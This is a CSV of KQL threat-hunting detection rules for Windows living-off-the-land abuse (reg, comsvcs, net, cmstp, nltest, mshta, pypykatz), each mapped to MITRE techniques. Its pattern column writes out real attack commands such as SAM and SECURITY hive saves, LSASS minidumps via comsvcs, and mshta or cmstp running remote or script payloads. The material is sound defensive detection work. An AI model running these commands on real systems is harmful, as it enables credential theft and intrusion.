,title,description,detectType,detectCon,detectLanguage,tags,attackTechnique,attackSoftware,references,pattern,dataSource,dataType,dataCollector,dataForwardTo,dataparser,dataParser,dataStorage,dataTable,dataIndex,dataAccess,dataMap,kqlVar,kqlTable,kqlQuery
108,reg_pid_0001_hklm_sam_save,['reg.exe used to save SAM file for potential enumeration'],,1,kql,['lolbin'],t1003.002,,,['reg save HKLM\\sam <path to dump file>'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg' 
  and ProcessCommandLine has 'save'
| where ProcessCommandLine contains 'sam'
| where ProcessCommandLine contains 'HKLM'
  or ProcessCommandLine contains 'HKEY_LOCAL_MACHINE'
"
109,reg_pid_0005_hklm_create_minint,"['The presence of MiniNT Registry key causes various Windows components to think they’re running in the Windows Preinstallation Environment.', 'Prevents windows event logs from working']",,3,kql,['lolbin'],t1562.002,,"['https://www.quppa.net/blog/2016/04/14/beware-of-the-minint-registry-key/', 'https://securitydatasets.com/notebooks/atomic/windows/defense_evasion/SDWIN-220803205800.html']","[""reg createkey -k 'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt'"", 'REG ADD HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt']",windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg'
| where ProcessCommandLine has 'SYSTEM' 
  and ProcessCommandLine has 'Control'
| where ProcessCommandLine contains @'\Control\MiniNt'
| where ProcessCommandLine has 'createkey'
  or ProcessCommandLine has 'add'"
110,reg_pid_0003_hklm_security_save,['reg.exe used to save SECURITY file for potential enumeration'],,1,kql,['lolbin'],t1003.002,,,['reg save HKLM\\security <path to dump file>'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg'
  and ProcessCommandLine has 'save'
  and ProcessCommandLine contains 'security'
| where ProcessCommandLine contains 'HKLM'
  or ProcessCommandLine contains 'HKEY_LOCAL_MACHINE'"
111,reg_pid_0003_hklm_system_save,['reg.exe used to save SYSTEM file for potential enumeration'],,2,kql,['lolbin'],t1003.002,,,['reg save HKLM\\system <path to dump file>'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'reg'
  and ProcessCommandLine has 'save'
  and ProcessCommandLine contains 'system'
| where ProcessCommandLine contains 'HKLM'
  or ProcessCommandLine contains 'HKEY_LOCAL_MACHINE'
| where ProcessCommandLine !contains @'system\'"
112,comsvcs_pid_0001_created_minidump,"['rundll calling comsvcs to dump process via minidump', 'potential lsass dump']",,1,kql,['lolbin'],t1003.001,,,"['rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump [LSASS_PID] dump.bin full', 'C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full', 'C:\\Windows\\System32\\rundll32.exe  C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> \\Windows\\Temp\\<filename>.dmp full', '.\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'comsvcs'
  and ProcessCommandLine has 'minidump'"
113,comsvcs_pid_0002_minidumpw_function_call,"['rundll calling comsvcs to dump process', 'function 24 is MiniDumpW function within comsvcs', 'potential lsass dump']",,1,kql,['lolbin'],t1003.001,,,"['sc  create DumpProc binpath= ""rundll32 comsvcs,#24 1204 c:\\windows\\tmp.log full""', 'rundll32.exe  comsvcs.dll,#24 600 C:\\Users\\user\\Desktop\\lsass.dmp full', 'cmd.exe /Q /c sc create DumpProc binpath= ""rundll32 comsvcs,#24 1204 c:\\windows\\tmp1654.log full"" 1> \\\\127.0.0.1\\ADMIN$\\__1622704760.494238 2>&1']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'comsvcs'
| where ProcessCommandLine contains '#24'
  or ProcessCommandLine contains '-24'"
114,comsvcs_pid_0003_created_file,"['comsvcs creating a file', 'possible .dmp file', 'potential lsass dump']",,1,kql,['lolbin'],t1003.001,,,[None],windows_os,"['file_creation', 'file_modify']",m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceFileEvents,| where InitiatingProcessCommandLine has 'comsvcs'
115,net_pid_0010_localgroup_add,['net command used to add to localgroups'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
  and ProcessCommandLine contains '/add'
"
116,net_pid_0004_domain_group,['net command run to list users in domain admins group'],,1,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine has 'group'
  and ProcessCommandLine contains 'Domain Admins'
| where ProcessCommandLine !contains '/add'
"
117,net_pid_0020_view,['net CLT view visible computers'],,3,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'view'
  and ProcessCommandLine contains '/view'
"
118,net_pid_0016_user_add,['net CLT used to add users on a device'],,3,kql,['lolbin'],t1087.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine contains '/add'
"
119,net_pid_0021_view_all,['net CLT view all visible computer shares'],,3,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'view'
  and ProcessCommandLine contains '/view'
  and ProcessCommandLine contains '/all'
"
120,net_pid_0008_file_rename,['net command renamed'],,1,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessVersionInfoOriginalFileName =~ 'net.exe'
  or ProcessVersionInfoOriginalFileName =~ 'net1.exe'
| where FileName !~ 'net.exe'
  and FileName !~ 'net1.exe'
"
121,net_pid_0022_stop_defender,['net CLT used to stop window defender service'],,3,kql,['lolbin'],t1562.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'stop'
  and ProcessCommandLine contains 'WindDefend'
"
122,net_pid_0015_user,"['net CLT used to list users on a device', 'net CLt used to show a users password policy/profile']",,3,kql,['lolbin'],t1087.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine !contains '/dom'
  and ProcessCommandLine !contains '/delete'
  and ProcessCommandLine !contains '/add'
"
123,net_pid_0009_localgroup,"['net command run to list localgroups', 'will list users in a localgroup']",,4,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
"
124,net_pid_0006_group_enterprise_admins,['net command run to list users in enterprise admins group'],,1,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine has 'group'
  and ProcessCommandLine contains 'Enterprise Admins'
| where ProcessCommandLine !contains '/add'
"
125,net_pid_0003_group_domain,"['net command run to list groups on a domain', 'will list users in a group if a group name is passed']",,4,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine contains 'group'"
126,net_pid_0001_output_redirected_to_file,"['net command run', ""output redirected '>' or '>>' to a file"", 'potential recon exfil']",,4,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'net' 
  or ProcessCommandLine has 'net1'
| where ProcessCommandLine contains '/dom'
| where ProcessCommandLine contains '>>'
  or ProcessCommandLine contains '>'
  or ProcessCommandLine contains 'C$'"
127,net_pid_0005_group_domain_admins_add,['net command run to add user to domain admins group'],,1,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine has 'group'
  and ProcessCommandLine contains 'Domain Admins'
| where ProcessCommandLine contains '/add'
"
128,net_pid_0011_localgroup_administrators,['net command used to list users in localgroup administrators'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
  and ProcessCommandLine has 'administrators'
| where ProcessCommandLine !contains '/add'
"
129,net_pid_0007_domain_group_enterprise_admins_add,['net command run to add users in enterprise admins group'],,1,kql,['lolbin'],t1069.002,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine contains '/dom'
  and ProcessCommandLine has 'group'
  and ProcessCommandLine contains 'Enterprise Admins'
| where ProcessCommandLine contains '/add'
"
130,net_pid_0011_localgroup_administrators,['net command used to list users in localgroup administrators'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
  and ProcessCommandLine has 'administrators'
| where ProcessCommandLine contains '/add'
"
131,net_pid_0014_localgroup_rdp_add,['net command used to add users in localgroup remote desktop users'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
| where ProcessCommandLine has 'Remote' 
  and ProcessCommandLine has 'Desktop'
  and ProcessCommandLine has 'Users'
| where ProcessCommandLine contains '/add'
"
132,net_pid_0017_user_domain_add,['net CLT used to add user to a domain'],,1,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine contains '/add'
  and ProcessCommandLine contains '/dom'
"
133,net_pid_0002_created_modified_file,"['net command run', ""output redirected '>' or '>>' to a file"", 'potential recon exfil']",,3,kql,['lolbin'],,s0039,,,windows_os,"['file_create', 'file_rename', 'file_modify', 'file_delete']",m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceFileEvents,"| where InitiatingProcessFileName =~'net.exe'
  or InitiatingProcessFileName =~ 'net1.exe'
| where isnotempty(InitiatingProcessCommandLine)
  and FileName !endswith '.exe'
  and isnotnull(FileSize)"
134,net_pid_0013_localgroup_rdp,['net command used to list users in localgroup remote desktop users'],,3,kql,['lolbin'],t1069.001,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'localgroup'
| where ProcessCommandLine has 'Remote' 
  and ProcessCommandLine has 'Desktop'
  and ProcessCommandLine has 'Users'
| where ProcessCommandLine !contains '/add'
"
135,net_pid_0019_user_passwordchg,"['net CLT used to add user to a domain', 'password set to not expire']",,3,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine contains '/passwordchg'
"
136,net_pid_0018_user_password_never_expire,"['net CLT used to add user to a domain', 'password set to not expire']",,3,kql,['lolbin'],,s0039,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'net.exe'
  or FileName =~ 'net1.exe'
| where ProcessCommandLine has 'user'
| where ProcessCommandLine contains 'net user'
  or ProcessCommandLine contains 'net1 user'
| where ProcessCommandLine contains '/expires'
  and ProcessCommandLine contains 'never'
"
137,cmstp_pid_0003_executing_inf_file_all_profiles_flag,['installs a specially formatted .inf with all profiles flag set'],,2,kql,['lolbin'],t1218.003,,,['cmstp.exe /s path\\to\\some_file.inf /au'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where ProcessCommandLine contains '.inf'
  and ProcessCommandLine contains '/au'"
138,cmstp_pid_0005_spawning_child_process,['rare activity of cmstp.exe spawning a child process'],,2,kql,['lolbin'],t1218.003,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where InitiatingProcessFileName =~ 'cmstp.exe'
  or InitiatingProcessVersionInfoOriginalFileName =~ 'cmstp.exe'"
139,cmstp_pid_0006_rare_folder_path,"[""rare activity of cmstp.exe being called from any folder that isn't system32""]",,3,kql,['lolbin'],t1036,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where FolderPath !contains @'c:\windows\system32\'"
140,cmstp_pid_0002_executing_inf_file_silent_flag,['installs a specially formatted .inf with silent flag set'],,2,kql,['lolbin'],t1218.003,,,"['cmstp.exe /s path\\to\\some_file.inf /au', 'cmstp.exe /s path\\to\\some_file.inf', 'cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf', 'cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where ProcessCommandLine contains '.inf'
  and ProcessCommandLine contains '/s'"
141,cmstp_pid_0004_executing_inf_file_single_suer_flag,['installs a specially formatted .inf with single user flag'],,2,kql,['lolbin'],t1218.003,,,['cmstp.exe /s path\\to\\some_file.inf /su'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where ProcessCommandLine contains '.inf'
  and ProcessCommandLine contains '/su'"
142,cmstp_pid_0001_executing_inf_file,['installs a specially formatted .inf'],,2,kql,['lolbin'],t1218.003,,,"['cmstp.exe /s path\\to\\some_file.inf /au', 'cmstp.exe /s path\\to\\some_file.inf', 'cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf', 'cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'cmstp'
  or ProcessVersionInfoOriginalFileName has 'cmstp'
| where ProcessCommandLine contains '.inf'"
143,nltest_pid_0001_dclist,"['nltest running dclist command flag', 'This command first queries Active Directory for a list of DCs', 'List all DCs in the domain']",,2,kql,['lolbin'],t1018,s0359,,['nltest.exe /dclist:#{target_domain}'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'nltest'
  and ProcessCommandLine contains '/dclist'"
144,nltest_pid_0004_dsgetdc,"['nltest running /dsgetdc command flag', 'List Domain Controllers and Info']",,2,kql,['lolbin'],t1018,s0359,,['nltest /dsgetdc:<domain.com>'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'nltest'
  and ProcessCommandLine contains '/dsgetdc'"
145,nltest_pid_0003_trusted_domains,"['nltest running /trusted_domains command flag', 'Returns a list of trusted domains']",,2,kql,['lolbin'],t1482,s0359,,['nltest /trusted_domains'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'nltest'
  and ProcessCommandLine contains '/trusted_domains'"
146,nltest_pid_0002_domain_trust,"['nltest running /domain_trust command flag', 'Returns a list of trusted domains']",,2,kql,['lolbin'],t1482,s0359,,['nltest /domain_trusts'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'nltest'
  and ProcessCommandLine contains '/domain_trusts'"
147,gsecdump_pid_0002_file_indicator,['Dump Creds from memory'],,1,kql,,t1003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceFileEvents,"| where FileName has 'gsecdump'
  or FileName startswith 'g64-'
  or InitiatingProcessFileName has 'gsecdump'"
148,gsecdump_pid_0001_dump_memory,['Dump Creds from memory'],,1,kql,,t1003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'gsecdump'
  or FileName has 'gsecdump'"
149,pypykatz_pid_0006_live_lsassdump,"['pypykatz live smb command', 'Dumps and parses the LSASS remotely over SMB', ""Connection is set up using the current user's context."", 'LSASS dump file will be deleted after command finishes (best effort)']",,2,kql,['python'],"['t1003.001', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'lsassdump'"
150,pypykatz_pid_0006_live_lsassdump,"['pypykatz live smb command', 'Enumerates shares, folders, files on the target(s) over SMB.']",,2,kql,['python'],"['t1135', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'lsassdump'"
151,pypykatz_pid_0010_commandline_indicator,['pypykatz indicator in the commandline'],,2,kql,['python'],,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'pypykatz'
  or InitiatingProcessCommandLine has 'pypykatz'"
152,pypykatz_pid_0002_live_lsa_write_outfile,"['pypykatz lsass dump commands', 'Obtains the credentials stored in the LSASS.exe process.']",,2,kql,['python'],t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
| where ProcessCommandLine contains 'live lsa'
  or (ProcessCommandLine has 'live' and ProcessCommandLine has 'lsa')
| where ProcessCommandLine contains '-o'
  or ProcessCommandLine contains '--json'"
153,pypykatz_pid_0003_live_registry,"['pypykatz dump sam or secrets files', 'Obtains the credentials / secrets / other info from live registry']",,2,kql,['python'],t1003.002,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
| where ProcessCommandLine contains 'live registry'"
154,pypykatz_pid_0001_live_lsa,"['pypykatz lsass dump commands', 'Obtains the credentials stored in the LSASS.exe process.']",,2,kql,['python'],t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
| where ProcessCommandLine contains 'live lsa'
  or (ProcessCommandLine has 'live' and ProcessCommandLine has 'lsa')"
155,pypykatz_pid_0005_live_dcsync,"['pypykatz dcsynce attack', 'Performs DCSYNC attack, extracts all hashes and kerberos keys from the domain controller using DRSUAPI']",,2,kql,['python'],"['t1003.006', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'dcsync'"
156,pypykatz_pid_0006_live_regdump,"['pypykatz live smb command', 'Dumps and parses the registry remotely over SMB.', ""Connection is set up using the current user's context."", 'registry hive files will be deleted after command finishes (best effort)']",,2,kql,['python'],"['t1003.002', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'regdump'"
157,pypykatz_pid_0006_live_secretsdump,"['pypykatz live smb command', 'performs lsassdump, regdump and dcsync']",,2,kql,['python'],"['t1003', 't1021.002']",,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
  and ProcessCommandLine has 'smb'
  and ProcessCommandLine has 'secretsdump'"
158,pypykatz_pid_0004_live_registry_write_outfile,"['pypykatz dump sam or secrets files', 'Obtains the credentials / secrets / other info from live registry']",,2,kql,['python'],t1003.002,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'live'
| where ProcessCommandLine contains 'live registry'
| where ProcessCommandLine contains '--json'
  or ProcessCommandLine contains '-o'"
159,mshta_pid_0010_rare_file_execution,['mshta executing a rare file extension'],,2,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mshta'
  or ProcessVersionInfoOriginalFileName has 'mshta'
| where ProcessCommandLine contains '.doc'
  or ProcessCommandLine contains '.xls'
  or ProcessCommandLine contains '.lnk'
  or ProcessCommandLine contains '.png'
  or ProcessCommandLine contains '.zip'
  or ProcessCommandLine contains '.jpg'
  or ProcessCommandLine contains '.bat'
"
160,mshta_pid_0002_executing_vbs,['mshta executing VBS files'],,3,kql,['lolbin'],t1218.005,,,"['mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file <filepath>"""":close"")']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'mshta'
  and ProcessCommandLine has 'vbscript'
  and ProcessCommandLine has 'execute'
| where ProcessCommandLine contains 'script'
  or ProcessCommandLine contains 'run'
  or ProcessCommandLine contains 'wscript'"
161,mshta_pid_0008_rare_process_spawn,"['mshta spawning a rare process', 'maybe result of suspicious HTA']",,2,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where InitiatingProcessFileName has 'mshta'
  or InitiatingProcessVersionInfoOriginalFileName has 'mshta'
| where FileName has 'cscript'
  or FileName has 'wscript'
  or FileName has 'powershell'
  or FileName has 'pwsh'
  or FileName contains 'regsvr'
  or FileName has 'reg'
  or FileName has 'bitsadmin'
"
162,mshta_pid_0004_executing_remote_file,['mshta executing remote file'],,2,kql,['lolbin'],t1218.005,,,['mshta (http:// or https://) filename.hta'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'mshta'
| where ProcessCommandLine contains 'http:'
  or ProcessCommandLine contains 'https:'
  or ProcessCommandLine contains 'ftp:'"
163,mshta_pid_0006_rare_execution_folder,"['mshta executing a file into or from a rare folder path', 'mshta executing a file into or from a folder path commonly abused by threat actors']",,3,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mshta'
  or ProcessVersionInfoOriginalFileName has 'mshta'
| where ProcessCommandLine contains @'\AppData\Local\'
  or ProcessCommandLine contains @'\Users\Public\'
  or ProcessCommandLine contains @'\Windows\Temp\'
  or ProcessCommandLine contains @'\ProgramData\'"
